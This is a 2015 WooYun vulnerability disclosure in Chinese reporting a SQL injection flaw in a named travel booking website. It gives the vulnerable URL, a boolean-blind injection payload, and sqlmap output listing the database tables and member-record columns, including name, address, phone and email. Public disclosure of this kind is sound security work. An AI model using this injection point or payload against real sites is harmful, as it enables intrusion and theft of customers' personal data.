wybug_title: 易联假期旅行网存在sql注入漏洞导致大量数据泄露
wybug_status: 未联系到厂商或者厂商积极忽略
wybug_detail: 漏洞详情 披露状态：   									2015-10-27：	积极联系厂商并且等待厂商认领中，细节不对外公开									2015-12-11：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： 易联假期旅行网   中国十佳存在sql注射漏洞会导致大量会员信息泄露  包括 姓名，年龄，地址，phon，email 详细说明：  存在sql注入漏洞地址  http://www.easy-linkholiday.com/mapgoogle.asp?id=17679sqlmap identified the following injection points with a total of 78 HTTP(s) requests:---Place: GETParameter: id    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=17679 AND 7947=7947---web server operating system: Windows 2003web application technology: ASP.NET, Microsoft IIS 6.0, ASPback-end DBMS: Microsoft Accesssqlmap identified the following injection points with a total of 0 HTTP(s) requests:可获取表---web server operating system: Windows 2003web application technology: ASP.NET, Microsoft IIS 6.0, ASPback-end DBMS: Microsoft AccessDatabase: Microsoft_Access_masterdb[3 tables]+-------+| group || user  || room  |+-------+以及大量会员信息umns]+---------+-------------+| Column  | Type        |+---------+-------------+| address | non-numeric || age     | non-numeric || cardid  | numeric     || email   | non-numeric || groupid | numeric     || id      | numeric     || name    | non-numeric || phone   | non-numeric || zip     | non-numeric |+---------+-------------+   漏洞证明：  +---------+-------------+| Column  | Type        |+---------+-------------+| address | non-numeric || age     | non-numeric || cardid  | numeric     || email   | non-numeric || groupid | numeric     || id      | numeric     || name    | non-numeric || phone   | non-numeric || zip     | non-numeric |+---------+-------------+大量会员信息泄露  包括 姓名，年龄，地址，phon，email   修复方案：  过滤参数大大们~让我常驻乌云吧@wooyun   版权声明：转载请注明来源 路人甲@乌云
wybug_reply: 漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝
